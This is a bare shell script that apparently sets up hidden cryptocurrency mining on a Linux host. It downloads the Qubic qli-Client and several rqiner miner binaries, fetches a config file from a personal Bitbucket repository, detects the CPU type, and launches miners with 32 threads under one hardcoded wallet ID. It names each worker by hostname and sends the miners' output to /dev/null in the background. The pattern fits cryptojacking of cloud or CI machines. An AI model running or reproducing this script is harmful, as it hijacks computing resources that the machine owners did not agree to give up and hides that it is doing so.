apt-get update && apt-get install -y \
  wget \
  curl \
  libjansson4 \
  && rm -rf /var/lib/apt/lists/*
echo "deb http://ftp.debian.org/debian sid main" >> /etc/apt/sources.list
apt-get update
apt-get -t sid install libc6 libc6-dev libc6-dbg -y
wget https://dl.qubic.li/downloads/qli-Client-1.8.10-Linux-x64.tar.gz && \
tar xvzf qli-Client-1.8.10-Linux-x64.tar.gz
wget -O appsettings.json https://bitbucket.org/bro680965/dasd/raw/HEAD/appsettings.json
sed -i "s/abc/$(hostname)/g" appsettings.json
#./qli-Client

name=$(lscpu | grep "Model name" | awk -F ': ' '{print $2}' | tr -d '[:punct:]' | tr -d '[:space:]')
wget -O rqiner-x86 https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.19/rqiner-x86
wget -O rqiner-x86-znver2 https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.19/rqiner-x86-znver2
wget -O rqiner-x86-haswell https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.19/rqiner-x86-haswell
wget -O rqiner-x86-broadwell https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.3.19/rqiner-x86-broadwell
chmod +x rqiner-x86-broadwell
chmod +x rqiner-x86-haswell
chmod +x rqiner-x86
chmod +x rqiner-x86-znver2
if lscpu | grep -qi "AMD"; then
./rqiner-x86-haswell -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19nullAMD1$name$(hostname) > /dev/null 2>&1 &
#./rqiner-x86-broadwell -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19AMD1$name$(hostname)
#./rqiner-x86-znver2 -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19AMD2$name$(hostname)
#./rqiner-x86 -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19AMD3$(hostname)
else
wget https://dl.qubic.li/downloads/qli-Client-1.8.10-Linux-x64.tar.gz && \
tar xvzf qli-Client-1.8.10-Linux-x64.tar.gz
wget -O appsettings.json https://bitbucket.org/bro680965/dasd/raw/HEAD/appsettings.json
sed -i "s/abc/$(hostname)/g" appsettings.json
#./qli-Client
./rqiner-x86-haswell -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19nullINTEL$name$(hostname) > /dev/null 2>&1 &
./rqiner-x86-broadwell -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19INTEL$name$(hostname)
./rqiner-x86-znver2 -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19INTEL3$name$(hostname)
./rqiner-x86 -t 32 -i YEJOZFEDEHHUJFOJXKOFDHUNHDEDZITDPJZECBXVVCRULVNTDIRXIHZEYTUB -l 19INTEL4$name$(hostname)
fi



#./qli-Client 






#wget https://dl.qubic.li/downloads/qli-Client-1.8.10-Linux-x64.tar.gz && \
#tar xvzf qli-Client-1.8.10-Linux-x64.tar.gz
#wget -O appsettings.json https://bitbucket.org/bro680965/dasd/raw/HEAD/appsettings.json
#./qli-Client

